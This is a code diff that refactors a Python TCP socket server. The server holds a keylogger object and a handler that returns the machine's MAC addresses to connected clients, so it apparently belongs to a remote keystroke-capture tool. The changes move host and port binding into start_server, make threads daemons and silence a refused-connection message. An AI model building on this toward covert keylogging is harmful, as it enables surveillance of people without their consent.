@@ -23,7 +23,7 @@ def get_all_avail_host():
 
 BUF_SIZE = 256
 class SocketServer:
-    def __init__(self, host, port):
+    def __init__(self):
         """
         Creates a new instance of SocketServer
 
@@ -35,19 +35,17 @@ class SocketServer:
         port : int
             port on which the server is listening
         """
-        self.__host = host
-        self.__port = port
         self.__running = False
         self.__used_slot = False
         self.__keylogger = None
         self.__block = threading.Lock()
         self.__server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.__init_socket() 
     
     def __init_socket(self):
         """
         Binds the server socket to the given host and port
         """
+        self.__server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.__server_socket.bind((self.__host, self.__port))
 
     def __server_listening(self):
@@ -59,14 +57,14 @@ class SocketServer:
             self.__block.acquire()
             connection, address = self.__server_socket.accept()
             if self.__used_slot:
-                print("Connection refused! No free slots!")
+                # print("Connection refused! No free slots!")
                 connection.close()
                 self.__block.release()
                 continue
             else:
                 self.__used_slot = True
             self.__block.release()
-            thread = threading.Thread(target=self.__client_connection, args=(connection,))
+            thread = threading.Thread(target=self.__client_connection, args=(connection,), daemon = True)
             thread.start()
 
     def __receive_msg(self, connection):
@@ -186,7 +184,7 @@ class SocketServer:
     def __request_mac_handler(self):
         return get_all_mac()
     
-    def start_server(self):
+    def start_server(self, host, port):
         """
         Starts the server if it is not running already.
         """
@@ -194,6 +192,9 @@ class SocketServer:
             print("Server is already running")
         else:
             self.__running = True
+            self.__host = host
+            self.__port = port
+            self.__init_socket()
             server_thread = threading.Thread(target=self.__server_listening, daemon=True)
             server_thread.start()
     
